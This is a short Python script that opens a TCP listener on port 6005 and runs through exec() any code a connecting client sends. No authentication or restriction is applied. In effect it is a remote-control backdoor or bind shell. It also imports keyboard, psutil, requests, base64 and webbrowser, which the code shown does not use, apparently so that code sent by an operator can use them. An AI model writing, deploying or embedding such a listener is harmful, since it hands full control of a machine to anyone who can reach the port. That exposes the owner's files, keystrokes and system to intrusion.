# coding:utf-8

import socket
import threading
import subprocess
import tkinter
import time
import os
import random
import keyboard
import psutil
import datetime
import base64
import requests
import sys
import webbrowser
import json


def find_ipv4():
    output = subprocess.check_output("ipconfig", shell=True).__str__().strip()
    lines = output.split("\n")
    ipv4_line = [line for line in lines if "ipv4" in line.lower()][0]
    ipv4 = ""
    i = len(ipv4_line) - 1
    while True:
        char = ipv4_line[i]
        if char not in ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', "."]:
            break
        ipv4 += char
        i -= 1
    ipv4 = ipv4[::-1]
    return ipv4


def remote(data):
    try:
        exec(data, globals())
        print("execution worked properly !")
    except:
        print("There was an error during execution")


class ClientThread(threading.Thread):
    def __init__(self, conn):
        threading.Thread.__init__(self)
        self.conn = conn

    def run(self):
        while True:
            data = self.conn.recv(8192).decode("utf-8")
            if not data:
                break
            threading.Thread(target=lambda: remote(data)).start()
        self.conn.close()


ipv4 = find_ipv4()
sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host, port = "", 6005
sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
              1)  # For the sk socket to be reusable multiple times without waiting delay
sk.bind((host, port))
print(f"Server started on http://{ipv4}:{port}")

while True:
    sk.listen(5)
    conn, address = sk.accept()
    print(f"The client {address} just connected.")
    client_thread = ClientThread(conn)
    client_thread.start()
sk.close()
